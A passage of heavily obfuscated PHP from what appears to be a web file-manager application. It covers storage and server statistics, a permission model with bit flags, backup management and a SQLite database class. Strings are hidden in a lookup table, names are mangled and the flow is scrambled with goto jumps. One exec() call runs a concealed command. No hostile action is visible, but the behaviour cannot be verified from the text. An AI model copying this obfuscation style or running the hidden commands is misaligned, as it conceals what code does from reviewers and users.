Model($C²ˆ¥§çÖ[1481])->count($C²ˆ¥§çÖ[1095]); $eÁº°ã„¥‚ = Model($C²ˆ¥§çÖ[1481])->where($C²ˆ¥§çÖ[1503])->count($C²ˆ¥§çÖ[1095]); goto cµÆô÷Ô¥¶; C‘ˆêµ³ŒÁ: } private function optionFile() { goto Déåã‰ÑĞ; Déåã‰ÑĞ: $AóˆÇé½×ù =& $_SERVER[İë¬“ÅÒÛ›]; $F¢‚ì¶âìô = $this->sourceSize(); $f’ù‡ñ…çŸ = $F¢‚ì¶âìô[$AóˆÇé½×ù[78]]; goto D¸µ˜¶‰ƒ“; bãœªÃæ: $EŠÖÙ’Ö½ = Model($AóˆÇé½×ù[522])->where($dçß¦È”ãø)->sum($AóˆÇé½×ù[78]); $dòÅ”¡Ñ•† = Model($AóˆÇé½×ù[522])->where($dçß¦È”ãø)->count($AóˆÇé½×ù[375]); return array($AóˆÇé½×ù[456] => $f’ù‡ñ…çŸ, $AóˆÇé½×ù[1476] => $fôÂ„‚ÙØï, $AóˆÇé½×ù[1510] => $f’ù‡ñ…çŸ - $fôÂ„‚ÙØï, $AóˆÇé½×ù[1511] => (int) $EŠÖÙ’Ö½, $AóˆÇé½×ù[458] => (int) $b×š…îæÇÁ, $AóˆÇé½×ù[1512] => (int) $dòÅ”¡Ñ•†); goto cİõ¦Å¬‰Ì; D¸µ˜¶‰ƒ“: $fôÂ„‚ÙØï = $F¢‚ì¶âìô[$AóˆÇé½×ù[1476]]; $b×š…îæÇÁ = Model($AóˆÇé½×ù[522])->where(array($AóˆÇé½×ù[376] => 0))->count($AóˆÇé½×ù[375]); $dçß¦È”ãø = array($AóˆÇé½×ù[376] => 0, $AóˆÇé½×ù[187] => array($AóˆÇé½×ù[698], strtotime(date($AóˆÇé½×ù[1484])))); goto bãœªÃæ; cİõ¦Å¬‰Ì: } private function optionAccess() { $aä³°˜Ó‘ =& $_SERVER[İë¬“ÅÒÛ›]; return array($aä³°˜Ó‘[453] => $this->typeLogCnt(), $aä³°˜Ó‘[90] => $this->typeLogCnt($aä³°˜Ó‘[90]), $aä³°˜Ó‘[1513] => $this->typeLogCnt($aä³°˜Ó‘[1513]), $aä³°˜Ó‘[1514] => $this->typeLogCnt($aä³°˜Ó‘[1514]), $aä³°˜Ó‘[1515] => $this->typeLogCnt($aä³°˜Ó‘[1515]), $aä³°˜Ó‘[417] => $this->typeLogCnt($aä³°˜Ó‘[33], $aä³°˜Ó‘[1488])); } private function typeLogCnt($aÈ“˜ÖÛ» = '', $AÔÒ®­¥˜ = "\x69\144") { goto C²™ª¡Æ; A§ÙŞ©“Ü: return (int) $DİøËí½À³; goto A¿±Ì²ğ¶õ; C²™ª¡Æ: $cÑ¼ğËÂ„î =& $_SERVER[İë¬“ÅÒÛ›]; $C¢‰ˆ›ìÆÏ = array($cÑ¼ğËÂ„î[90] => array($cÑ¼ğËÂ„î[1516], $cÑ¼ğËÂ„î[1517]), $cÑ¼ğËÂ„î[1513] => array($cÑ¼ğËÂ„î[1518]), $cÑ¼ğËÂ„î[1514] => array($cÑ¼ğËÂ„î[1519], $cÑ¼ğËÂ„î[1520]), $cÑ¼ğËÂ„î[1515] => array($cÑ¼ğËÂ„î[1521], $cÑ¼ğËÂ„î[1522]), $cÑ¼ğËÂ„î[1523] => array($cÑ¼ğËÂ„î[1524], $cÑ¼ğËÂ„î[1525], $cÑ¼ğËÂ„î[1526])); $e¸„‡ù¬™² = strtotime(date($cÑ¼ğËÂ„î[1484])); goto e­âÃ¿¸Š; e­âÃ¿¸Š: $få´ğ«±À„ = array($cÑ¼ğËÂ„î[187] => array($cÑ¼ğËÂ„î[698], $e¸„‡ù¬™²)); if ($aÈ“˜ÖÛ») { $få´ğ«±À„[$cÑ¼ğËÂ„î[29]] = array($cÑ¼ğËÂ„î[7], $C¢‰ˆ›ìÆÏ[$aÈ“˜ÖÛ»]); } $DİøËí½À³ = Model($cÑ¼ğËÂ„î[1487])->where($få´ğ«±À„)->count($AÔÒ®­¥˜); goto A§ÙŞ©“Ü; A¿±Ì²ğ¶õ: } private function optionServer() { goto aÍµ¡³˜Ø±; aÍµ¡³˜Ø±: $BğİŞ•ˆÛ =& $_SERVER[İë¬“ÅÒÛ›]; $Eİ³¨µ¤ß = $this->diskDriver(); $A½„Ÿœ„ = KodIO::defaultDriver(); goto Dˆë¹ƒìæ½; b¡ÏÛ†ì¾–: return array($BğİŞ•ˆÛ[1529] => $Eİ³¨µ¤ß ? $Eİ³¨µ¤ß[$BğİŞ•ˆÛ[1530]] : 0, $BğİŞ•ˆÛ[1531] => $Eİ³¨µ¤ß ? $Eİ³¨µ¤ß[$BğİŞ•ˆÛ[1532]] : 0, $BğİŞ•ˆÛ[1533] => (int) $A½„Ÿœ„[$BğİŞ•ˆÛ[1530]] * 1024 * 1024 * 1024, $BğİŞ•ˆÛ[1534] => (int) $déÕí™Ã“, $BğİŞ•ˆÛ[1535] => ucfirst($FäÊƒ ¢ñĞ), $BğİŞ•ˆÛ[1536] => $BğİŞ•ˆÛ[1537] . PHP_VERSION, $BğİŞ•ˆÛ[1538] => phpBuild64() ? 64 : 32, $BğİŞ•ˆÛ[452] => str_replace($BğİŞ•ˆÛ[1539], $BğİŞ•ˆÛ[674], $Bì—ƒ…ËôØ), $BğİŞ•ˆÛ[341] => ucfirst($FÏ÷¤Ñï¯Å), $BğİŞ•ˆÛ[28] => $_SERVER[$BğİŞ•ˆÛ[1540]]); goto bŠÜ’Û…Çƒ; eÒĞùå¢Çó: if ($Bì—ƒ…ËôØ == $BğİŞ•ˆÛ[492]) { $bîØ¿Ş–ã = explode($BğİŞ•ˆÛ[493], $b£ÂØ™æ£[$BğİŞ•ˆÛ[494]]); $Bì—ƒ…ËôØ = $bîØ¿Ş–ã[0]; } if ($Bì—ƒ…ËôØ == $BğİŞ•ˆÛ[590] || $Bì—ƒ…ËôØ == $BğİŞ•ˆÛ[474]) { $cæå¬£õÃ‡ = Model()->db()->query($BğİŞ•ˆÛ[1527]); $a×Â÷¹Ÿ­ß = $cæå¬£õÃ‡[0] && isset($cæå¬£õÃ‡[0][$BğİŞ•ˆÛ[1003]]) ? $cæå¬£õÃ‡[0][$BğİŞ•ˆÛ[1003]] : 0; $Bì—ƒ…ËôØ = $BğİŞ•ˆÛ[1528] . ($a×Â÷¹Ÿ­ß ? $BğİŞ•ˆÛ[8] . $a×Â÷¹Ÿ­ß : $BğİŞ•ˆÛ[33]); } $FÏ÷¤Ñï¯Å = $GLOBALS[$BğİŞ•ˆÛ[6]][$BğİŞ•ˆÛ[341]][$BğİŞ•ˆÛ[523]]; goto b¡ÏÛ†ì¾–; Dˆë¹ƒìæ½: $c‰Ñ‚âğ§ = array($BğİŞ•ˆÛ[481] => $A½„Ÿœ„[$BğİŞ•ˆÛ[369]]); $déÕí™Ã“ = Model($BğİŞ•ˆÛ[412])->where($c‰Ñ‚âğ§)->sum($BğİŞ•ˆÛ[78]); $f¶¸ Æ™Æ = explode($BğİŞ•ˆÛ[50], $_SERVER[$BğİŞ•ˆÛ[136]]); goto Cô™¥áÉ’³; Cô™¥áÉ’³: $FäÊƒ ¢ñĞ = $f¶¸ Æ™Æ[0]; $b£ÂØ™æ£ = $GLOBALS[$BğİŞ•ˆÛ[6]][$BğİŞ•ˆÛ[17]]; $Bì—ƒ…ËôØ = $b£ÂØ™æ£[$BğİŞ•ˆÛ[491]]; goto eÒĞùå¢Çó; bŠÜ’Û…Çƒ: } private function diskDriver() { goto E†ÌÂäÎ; e¾¥»¤©¹: $Eå³„óÃ¼ = $bŒˆ‡ôßò² - @disk_free_space($BšÉ§ŞÙåÁ); return array($eµ°ÆÍŸ×Ş[1530] => $bŒˆ‡ôßò², $eµ°ÆÍŸ×Ş[1532] => $Eå³„óÃ¼); goto Bë§‹Ó×Ùº; E†ÌÂäÎ: $eµ°ÆÍŸ×Ş =& $_SERVER[İë¬“ÅÒÛ›]; $BšÉ§ŞÙåÁ = $eµ°ÆÍŸ×Ş[8]; $c•ô¹é„¼ = $GLOBALS[$eµ°ÆÍŸ×Ş[6]][$eµ°ÆÍŸ×Ş[1541]] == $eµ°ÆÍŸ×Ş[1542]; goto d©£öƒğ–ë; d©£öƒğ–ë: if ($c•ô¹é„¼) { $BšÉ§ŞÙåÁ = $eµ°ÆÍŸ×Ş[1543]; if (function_exists($eµ°ÆÍŸ×Ş[1544])) { exec($eµ°ÆÍŸ×Ş[1545], $cÓ„éÓ³ƒŠ); $BšÉ§ŞÙåÁ = $cÓ„éÓ³ƒŠ[1] . $eµ°ÆÍŸ×Ş[8]; } } if (!file_exists($BšÉ§ŞÙåÁ)) { return; } $bŒˆ‡ôßò² = @disk_total_space($BšÉ§ŞÙåÁ); goto e¾¥»¤©¹; Bë§‹Ó×Ùº: } public function fileChart($B›ÛÜİªŸ) { goto A§ŸìË¼î; Fõ¬¿…ÀĞ¼: $c™ê—ğ¼Ì[$C­ï…™«Èë[394]] = 2; $AœäÄÓ²“Ç = Model($C­ï…™«Èë[522])->where($c™ê—ğ¼Ì)->sum($C­ï…™«Èë[78]); return array($C­ï…™«Èë[456] => $FŠ’öù™«–[$C­ï…™«Èë[78]], $C­ï…™«Èë[1476] => $FŠ’öù™«–[$C­ï…™«Èë[1476]], $C­ï…™«Èë[1477] => (int) $CË´·ÀŒ¥†, $C­ï…™«Èë[1478] => (int) $AœäÄÓ²“Ç); goto c««–ÓğÙÇ; Cùøñ‚ãÓ¹: $FŠ’öù™«– = $this->sourceSize(); $c™ê—ğ¼Ì = array($C­ï…™«Èë[385] => 0, $C­ï…™«Èë[394] => 1); $CË´·ÀŒ¥† = Model($C­ï…™«Èë[522])->where($c™ê—ğ¼Ì)->sum($C­ï…™«Èë[78]); goto Fõ¬¿…ÀĞ¼; A§ŸìË¼î: $C­ï…™«Èë =& $_SERVER[İë¬“ÅÒÛ›]; if (isset($B›ÛÜİªŸ[$C­ï…™«Èë[1095]])) { return Model($C­ï…™«Èë[522])->userFileTypeProfile($B›ÛÜİªŸ[$C­ï…™«Èë[1095]]); } if (isset($B›ÛÜİªŸ[$C­ï…™«Èë[1546]])) { return Model($C­ï…™«Èë[522])->groupFileTypeProfile($B›ÛÜİªŸ[$C­ï…™«Èë[1546]]); } goto Cùøñ‚ãÓ¹; c««–ÓğÙÇ: } private function sourceSize() { $Eè´“‚ë½ƒ =& $_SERVER[İë¬“ÅÒÛ›]; $cÇ’É†‡ó = Model($Eè´“‚ë½ƒ[522])->where(array($Eè´“‚ë½ƒ[376] => 0))->sum($Eè´“‚ë½ƒ[78]); $DéÄ…™·Û¶ = Model($Eè´“‚ë½ƒ[412])->sum($Eè´“‚ë½ƒ[78]); if ($DéÄ…™·Û¶ > $cÇ’É†‡ó) { $DéÄ…™·Û¶ = $cÇ’É†‡ó; } return array($Eè´“‚ë½ƒ[78] => (int) $cÇ’É†‡ó, $Eè´“‚ë½ƒ[1476] => (int) $DéÄ…™·Û¶); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $bâíÌàóÜ  =& $_SERVER[İë¬“ÅÒÛ›]; $EõÑ¿¥¿ª = array(array($bâíÌàóÜ [388] => LNG($bâíÌàóÜ [1547]), $bâíÌàóÜ [1548] => $bâíÌàóÜ [1549], $bâíÌàóÜ [1550] => 6, $bâíÌàóÜ [1551] => 1, $bâíÌàóÜ [1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bâíÌàóÜ [388] => LNG($bâíÌàóÜ [1553]), $bâíÌàóÜ [1548] => $bâíÌàóÜ [1554], $bâíÌàóÜ [1550] => 1, $bâíÌàóÜ [1551] => 1, $bâíÌàóÜ [1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bâíÌàóÜ [388] => LNG($bâíÌàóÜ [1555]), $bâíÌàóÜ [1548] => $bâíÌàóÜ [1556], $bâíÌàóÜ [1550] => 2, $bâíÌàóÜ [1551] => 1, $bâíÌàóÜ [1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bâíÌàóÜ [388] => LNG($bâíÌàóÜ [1557]), $bâíÌàóÜ [1548] => $bâíÌàóÜ [1556], $bâíÌàóÜ [1550] => 3, $bâíÌàóÜ [1551] => 1, $bâíÌàóÜ [1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bâíÌàóÜ [388] => LNG($bâíÌàóÜ [1558]), $bâíÌàóÜ [1548] => $bâíÌàóÜ [1559], $bâíÌàóÜ [1550] => 4, $bâíÌàóÜ [1551] => 1, $bâíÌàóÜ [1552] => self::AUTH_SHOW | self::AUTH_VIEW), array($bâíÌàóÜ [388] => LNG($bâíÌàóÜ [1560]), $bâíÌàóÜ [1548] => $bâíÌàóÜ [1561], $bâíÌàóÜ [1550] => 5, $bâíÌàóÜ [1551] => 1, $bâíÌàóÜ [1552] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bâíÌàóÜ [388] => LNG($bâíÌàóÜ [1562]), $bâíÌàóÜ [1548] => $bâíÌàóÜ [1563], $bâíÌàóÜ [1550] => 7, $bâíÌàóÜ [1551] => 1, $bâíÌàóÜ [1552] => 0)); return $EõÑ¿¥¿ª; } public static function authCheck($Dà×´¤’Í, $DôŸìì°¥) { $Dà×´¤’Í = intval($Dà×´¤’Í); if ($GLOBALS[$_SERVER[İë¬“ÅÒÛ›][1030]]) { return !0; } if ($Dà×´¤’Í <= 0) { return !1; } if (($Dà×´¤’Í & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Dà×´¤’Í & $DôŸìì°¥); } public static function authCheckShow($aë¤“äãÙ¿) { return self::authCheck($aë¤“äãÙ¿, self::AUTH_SHOW); } public static function authCheckView($a¯¦§îç®) { return self::authCheck($a¯¦§îç®, self::AUTH_VIEW); } public static function authCheckDownload($e†›ğŒ÷Š) { return self::authCheck($e†›ğŒ÷Š, self::AUTH_DOWNLOAD); } public static function authCheckUpload($B‚ÍÕˆ…÷) { return self::authCheck($B‚ÍÕˆ…÷, self::AUTH_UPLOAD); } public static function authCheckEdit($E†î‚’ç¨İ) { return self::authCheck($E†î‚’ç¨İ, self::AUTH_EDIT); } public static function authCheckRemove($b¢˜ÏÂ‡¶Õ) { return self::authCheck($b¢˜ÏÂ‡¶Õ, self::AUTH_REMOVE); } public static function authCheckShare($AŞ¿ô½Òå) { return self::authCheck($AŞ¿ô½Òå, self::AUTH_SHARE); } public static function authCheckComment($a¢¯•±êË) { return self::authCheck($a¢¯•±êË, self::AUTH_COMMENT); } public static function authCheckEvent($fÖé”‡µƒ) { return self::authCheck($fÖé”‡µƒ, self::AUTH_EVENT); } public static function authCheckRoot($c…½¤Ö¨Ñ¢) { return self::authCheck($c…½¤Ö¨Ñ¢, self::AUTH_ROOT); } public static function authDisable($b’Ú¸Û¸, $E§ƒÄ‚²®Å) { if (intval($b’Ú¸Û¸) <= 0) { return 0; } return intval($b’Ú¸Û¸) & ~$E§ƒÄ‚²®Å; } public $optionType = "\x53\171\x73\164\x65\155\56\x73\x6f\165\162\143\145\101\165\x74\x68\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\x61\165\x74\150", "\x6c\141\142\145\154", "\x64\151\163\x70\x6c\x61\171", "\163\171\x73\164\145\155", "\x73\x6f\x72\x74"); public function initData() { $b®™ğ–™Ì¨ = $this->authDefault(); foreach ($b®™ğ–™Ì¨ as $B‡…¶ÔÍì) { $this->add($B‡…¶ÔÍì); } } public function listData($F¹¢Õ‚Š¤Œ = false, $C¹¶êÂ…Ô = "\163\x6f\x72\x74", $aÍè‡àÀó³ = false) { return parent::listData($F¹¢Õ‚Š¤Œ, $C¹¶êÂ…Ô, $aÍè‡àÀó³); } public function update($e‘§İÕˆ„Æ, $CòØ¬Úé) { $E­ÅÄñƒñƒ =& $_SERVER[İë¬“ÅÒÛ›]; $bİí´Û¼¹Ì = parent::listData($e‘§İÕˆ„Æ); $FÂ‘äšÂÍ = $this->findByName($CòØ¬Úé[$E­ÅÄñƒñƒ[28]]); if (!$bİí´Û¼¹Ì || $FÂ‘äšÂÍ && $FÂ‘äšÂÍ[$E­ÅÄñƒñƒ[369]] != $bİí´Û¼¹Ì[$E­ÅÄñƒñƒ[369]]) { return !1; } $this->filterAuth($CòØ¬Úé[$E­ÅÄñƒñƒ[550]]); return parent::update($e‘§İÕˆ„Æ, $CòØ¬Úé); } public function remove($aÀĞ¼«ßÈ©) { $b­Êè¬äÑ§ = parent::listData($aÀĞ¼«ßÈ©); if (!$b­Êè¬äÑ§ || $b­Êè¬äÑ§[$_SERVER[İë¬“ÅÒÛ›][827]]) { return !1; } return parent::remove($aÀĞ¼«ßÈ©); } public function add($b‡àğœç¥† = array()) { goto F¤Æùİ„öÒ; F¤Æùİ„öÒ: $d£¶ˆñ÷éğ =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->findByName($b‡àğœç¥†[$d£¶ˆñ÷éğ[28]])) { return !1; } $EÆ”ÂÜ¶ôÌ = array($d£¶ˆñ÷éğ[28] => $d£¶ˆñ÷éğ[33], $d£¶ˆñ÷éğ[550] => 1, $d£¶ˆñ÷éğ[1564] => $d£¶ˆñ÷éğ[1565], $d£¶ˆñ÷éğ[1566] => 1, $d£¶ˆñ÷éğ[827] => 0, $d£¶ˆñ÷éğ[1567] => 0); goto Fªñ»±ÊˆÊ; Fªñ»±ÊˆÊ: $b‡àğœç¥† = array_merge($EÆ”ÂÜ¶ôÌ, $b‡àğœç¥†); $b‡àğœç¥†[$d£¶ˆñ÷éğ[1567]] = $this->getSort(); $this->filterAuth($b‡àğœç¥†[$d£¶ˆñ÷éğ[550]]); goto b…§¦¥ãª™; b…§¦¥ãª™: return parent::insert($b‡àğœç¥†); goto D½ÌÕàÆÅ ; D½ÌÕàÆÅ : } private function getSort() { $AÁÏŞÙÊÅš =& $_SERVER[İë¬“ÅÒÛ›]; $eÙŠä›„Õ„ = parent::listData(); $c¶ÈôÌãŠ• = array_to_keyvalue($eÙŠä›„Õ„, $AÁÏŞÙÊÅš[33], $AÁÏŞÙÊÅš[1567]); return empty($c¶ÈôÌãŠ•) ? 0 : max($c¶ÈôÌãŠ•) + 1; } private function filterAuth(&$A§÷ßŒ¹·­) { goto DÀ£±ß‘Âå; A¤ÒÛØÄÄ: foreach ($F˜êÑ¾‘øÀ as $b¸±ÒÏ…óĞ) { if ($A§÷ßŒ¹·­ & $b¸±ÒÏ…óĞ) { $d¥Û½Œ…¯Æ[] = $b¸±ÒÏ…óĞ; } } if (in_array(self::AUTH_ROOT, $d¥Û½Œ…¯Æ)) { $A§÷ßŒ¹·­ = array_sum($F˜êÑ¾‘øÀ); return; } $BñÍ¬´± = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bâ ·ŒÛª; DÀ£±ß‘Âå: if (!$A§÷ßŒ¹·­) { return; } $F˜êÑ¾‘øÀ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $d¥Û½Œ…¯Æ = array(); goto A¤ÒÛØÄÄ; bâ ·ŒÛª: foreach ($d¥Û½Œ…¯Æ as $b¸±ÒÏ…óĞ) { if (isset($BñÍ¬´±[$b¸±ÒÏ…óĞ])) { $d¥Û½Œ…¯Æ = array_merge($d¥Û½Œ…¯Æ, $BñÍ¬´±[$b¸±ÒÏ…óĞ]); } } $d¥Û½Œ…¯Æ[] = self::AUTH_SHOW; $A§÷ßŒ¹·­ = array_sum(array_unique($d¥Û½Œ…¯Æ)); goto b®²ˆÇŸ¶Ø; b®²ˆÇŸ¶Ø: } public function sort($DØµóø¦ù¨, $b‰ˆµô°Ü) { return parent::update($DØµóø¦ù¨, $b‰ˆµô°Ü); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\142\141\x63\x6b\x75\160\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\156\141\155\x65", "\163\x74\x61\164\165\163", "\143\157\156\164\x65\156\x74", "\x72\x65\x73\x75\154\x74", "\x74\x69\155\145\106\162\x6f\155", "\164\151\x6d\145\124\157"); public function config() { goto a¦Š¾ºôÂñ; a¦Š¾ºôÂñ: $A¿ì·–Ò½ =& $_SERVER[İë¬“ÅÒÛ›]; $aß¥²Ñ×£Ü = Model($A¿ì·–Ò½[835])->get($A¿ì·–Ò½[469]); $aß¥²Ñ×£Ü = json_decode($aß¥²Ñ×£Ü, !0); goto Fì¶˜‘÷öö; DèÎÖİ‚ø­: if (isset($B‰İ‘‰—Ê“[$A¿ì·–Ò½[190]])) { $B‰İ‘‰—Ê“[$A¿ì·–Ò½[190]] = json_decode($B‰İ‘‰—Ê“[$A¿ì·–Ò½[190]], !0); } if (isset($aß¥²Ñ×£Ü[$A¿ì·–Ò½[190]])) { $B‰İ‘‰—Ê“[$A¿ì·–Ò½[190]][$A¿ì·–Ò½[1070]] = $aß¥²Ñ×£Ü[$A¿ì·–Ò½[190]]; unset($aß¥²Ñ×£Ü[$A¿ì·–Ò½[190]]); } return array_merge($B‰İ‘‰—Ê“, $aß¥²Ñ×£Ü); goto C¢İõÂóß; C‰æáÅƒåÄ: Action($A¿ì·–Ò½[1568])->taskInit(); $e‹ÕƒÏèëÔ = Model($A¿ì·–Ò½[1569])->listData(); foreach ($e‹ÕƒÏèëÔ as $e‰Ùï‹¼™ï) { if ($e‰Ùï‹¼™ï[$A¿ì·–Ò½[827]] == $A¿ì·–Ò½[377] && $e‰Ùï‹¼™ï[$A¿ì·–Ò½[1083]] == $A¿ì·–Ò½[1570]) { $B‰İ‘‰—Ê“ = $e‰Ùï‹¼™ï; break; } } goto DèÎÖİ‚ø­; Fì¶˜‘÷öö: $aß¥²Ñ×£Ü = is_array($aß¥²Ñ×£Ü) ? $aß¥²Ñ×£Ü : array(); if (!isset($aß¥²Ñ×£Ü[$A¿ì·–Ò½[450]])) { $aß¥²Ñ×£Ü[$A¿ì·–Ò½[450]] = $A¿ì·–Ò½[403]; } $B‰İ‘‰—Ê“ = array(); goto C‰æáÅƒåÄ; C¢İõÂóß: } public function listData($FÖ—Ï…¦÷ = false, $F‚›ìÖ‹åĞ = "\x6d\157\144\151\x66\x79\124\151\155\145", $b¶ñ¯„›èÄ = false) { return parent::listData($FÖ—Ï…¦÷, $F‚›ìÖ‹åĞ, !0); } public function lastItem() { $b™ØÇ§§†’ = $this->listData(); return !empty($b™ØÇ§§†’[0]) ? $b™ØÇ§§†’[0] : null; } public function kill($AÍ¤ˆó”‘æ) { goto aĞ›¼µ¬ÌŒ; A´‰õÍä: $A™ŒìŠ¬‘ = $Bå•”§ÜŞ[$bÓŞìŒâˆ[28]]; $c¯‘‡çíÎò = TEMP_FILES . $bÓŞìŒâˆ[476] . $A™ŒìŠ¬‘ . $bÓŞìŒâˆ[8]; IO::remove($c¯‘‡çíÎò, !1); goto EŒø·˜Ü†Ã; EŒø·˜Ü†Ã: return $this->remove($AÍ¤ˆó”‘æ); goto cÊ¸ƒÎù«’; c˜ÂÙ–ñ¢: Task::kill($bÓŞìŒâˆ[468]); Task::kill($bÓŞìŒâˆ[498]); Task::kill($bÓŞìŒâˆ[506]); goto A´‰õÍä; aĞ›¼µ¬ÌŒ: $bÓŞìŒâˆ =& $_SERVER[İë¬“ÅÒÛ›]; $Bå•”§ÜŞ = $this->listData($AÍ¤ˆó”‘æ); if (!$Bå•”§ÜŞ || empty($Bå•”§ÜŞ[$bÓŞìŒâˆ[28]])) { return !0; } goto c˜ÂÙ–ñ¢; cÊ¸ƒÎù«’: } public function remove($CÁæëÁŸ¦§) { $F—õŞÎã®… = $this->listData($CÁæëÁŸ¦§); if (!$F—õŞÎã®…) { return !0; } return $this->backupRemove($F—õŞÎã®…); } private function backupRemove($AÍ†àêòÓò) { $aªÒ½¶ùÔÒ =& $_SERVER[İë¬“ÅÒÛ›]; parent::remove($AÍ†àêòÓò[$aªÒ½¶ùÔÒ[369]]); $DÉñÉ»Œ = "\x7b\x69\x6f\72{$AÍ†àêòÓò[$aªÒ½¶ùÔÒ[449]]}\175\57\x64\141\164\141\x62\141\x73\x65\57" . $AÍ†àêòÓò[$aªÒ½¶ùÔÒ[28]]; IO::remove($DÉñÉ»Œ, !1); return !0; } public function start() { goto F²µ…ñ¸; B »Ø®¯àµ: $EÜ¶Œ§¯é‘ = new Backup(); $EÜ¶Œ§¯é‘->keep(); if (!$EÜ¶Œ§¯é‘->db()) { return !1; } goto EµÈİµŒ†‰; F²µ…ñ¸: $däá–ä  =& $_SERVER[İë¬“ÅÒÛ›]; $a›ÁˆŒ™â = $this->config(); if (!$a›ÁˆŒ™â || $a›ÁˆŒ™â[$däá–ä [1068]] != $däá–ä [377]) { return !1; } goto B’»Ò„È´™; EµÈİµŒ†‰: if (!$EÜ¶Œ§¯é‘->dbFile()) { return !1; } if ($a›ÁˆŒ™â[$däá–ä [450]] == $däá–ä [403]) { $EÜ¶Œ§¯é‘->file(); } Backup::set(array($däá–ä [447] => 1, $däá–ä [461] => time())); goto f˜äÛ¼ÅÚô; f˜äÛ¼ÅÚô: return !0; goto d…¬øÄƒØ†; B’»Ò„È´™: if (Hook::trigger($däá–ä [1571]) == $däá–ä [1572]) { return !0; } $Dí†µÃé = $this->process(); foreach ($Dí†µÃé as $f‡‘Ÿ‡ƒ‘ì) { if ($f‡‘Ÿ‡ƒ‘ì) { return Task::restart($f‡‘Ÿ‡ƒ‘ì[$däá–ä [369]]); } } goto B »Ø®¯àµ; d…¬øÄƒØ†: } public function process() { $CÔº’¼ =& $_SERVER[İë¬“ÅÒÛ›]; return array($CÔº’¼[452] => Task::get($CÔº’¼[468]), $CÔº’¼[455] => Task::get($CÔº’¼[498]), $CÔº’¼[164] => Task::get($CÔº’¼[506])); } public function restore() { $E•½íâÒ˜ =& $_SERVER[İë¬“ÅÒÛ›]; ActionCall($E•½íâÒ˜[1573], !0, 1); ActionCall($E•½íâÒ˜[1573], !0, 0); } } goto DÔ«òùÉ; DÍ†ÜØ¼‰Á: class DbSqlite3Base extends Db { public function __construct($eÈ¯¡¹§õ = '') { $cÕ´‘Œ÷ÃÂ =& $_SERVER[İë¬“ÅÒÛ›]; if (!class_exists($cÕ´‘Œ÷ÃÂ[51])) { think_exception(think_lang($cÕ´‘Œ÷ÃÂ[10]) . $cÕ´‘Œ÷ÃÂ[52]); } if (!empty($eÈ¯¡¹§õ)) { if (!isset($eÈ¯¡¹§õ[$cÕ´‘Œ÷ÃÂ[12]])) { $eÈ¯¡¹§õ[$cÕ´‘Œ÷ÃÂ[12]] = 438; } $this->config = $eÈ¯¡¹§õ; if (empty($this->config[$cÕ´‘Œ÷ÃÂ[13]])) { $this->config[$cÕ´‘Œ÷ÃÂ[13]] = array(); } } } public function connect($AéØ´ª˜Ú = '', $A¡“Õ¢ùÒ¢ = 0) { $Fø„õË’‡Ş =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($this->linkID[$A¡“Õ¢ùÒ¢])) { if (empty($AéØ´ª˜Ú)) { $AéØ´ª˜Ú = $this->config; } $this->linkID[$A¡“Õ¢ùÒ¢] = new SQLite3($AéØ´ª˜Ú[$Fø„õË’‡Ş[17]]); if (!$this->linkID[$A¡“Õ¢ùÒ¢]) { think_exception($this->linkID[$A¡“Õ¢ùÒ¢]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$A¡“Õ¢ùÒ¢]->busyTimeout(30000); if (1 != think_config($Fø„õË’‡Ş[18])) { unset($this->config); } } return $this->linkID[$A¡“Õ¢ùÒ¢]; } public function free() { $this->queryID = null; } public function query($a±ï¿½š´) { goto aê•²Ù˜„ß; FîÌÚŒÙ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $b«“«ğãØ = $this->getAll(); $this->numRows = count($b«“«ğãØ); return $b«“«ğãØ; } goto Dâ‡›Çİ¸ø; F‚ÓØ¯š›„: $this->queryStr = $a±ï¿½š´; if ($this->queryID) { $this->free(); } think_action_status($Dé‹î­ºÌ[19], 1); goto AŒ¶À˜ˆ“; aê•²Ù˜„ß: $Dé‹î­ºÌ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F‚ÓØ¯š›„; AŒ¶À˜ˆ“: think_status($Dé‹î­ºÌ[20]); $this->queryID = $this->_linkID->query($a±ï¿½š´); $this->debug(); goto FîÌÚŒÙ; Dâ‡›Çİ¸ø: } public function execute($EõÒƒîáöÛ) { goto aë…Úº¤Ô‰; aàéá—Éè‹: $this->queryStr = $EõÒƒîáöÛ; if ($this->queryID) { 